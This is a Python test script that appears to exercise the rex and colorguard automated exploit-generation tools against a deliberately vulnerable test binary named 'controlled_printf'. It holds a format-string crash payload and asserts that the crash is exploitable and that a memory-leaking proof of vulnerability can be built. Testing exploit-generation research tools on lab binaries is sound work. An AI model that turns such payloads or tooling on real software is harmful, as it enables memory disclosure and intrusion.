from rex import pov_fuzzing
import os
import colorguard
import nose
bin_location = str(os.path.join(os.path.dirname(os.path.realpath(__file__)), '../../binaries'))

import logging
logging.getLogger("rex").setLevel("DEBUG")

def _do_pov_test(pov, enable_randomness=True):
    """
    Test a POV
    """
    for _ in range(10):
        if pov.test_binary(enable_randomness=enable_randomness):
            return True
    return False

crash = "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%X%x%sAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
binary = os.path.join(bin_location, "tests/i386/controlled_printf")

pov_fuzzer = pov_fuzzing.Type2CrashFuzzer(binary, crash)

assert any(pov_fuzzer.test_binary() for _ in range(10))

assert pov_fuzzer.exploitable()

assert pov_fuzzer.dumpable()

cg = colorguard.ColorGuard(binary, pov_fuzzer.get_leaking_payload())

nose.tools.assert_true(cg.causes_leak())

pov = cg.attempt_pov()

nose.tools.assert_true(_do_pov_test(pov, enable_randomness=False))
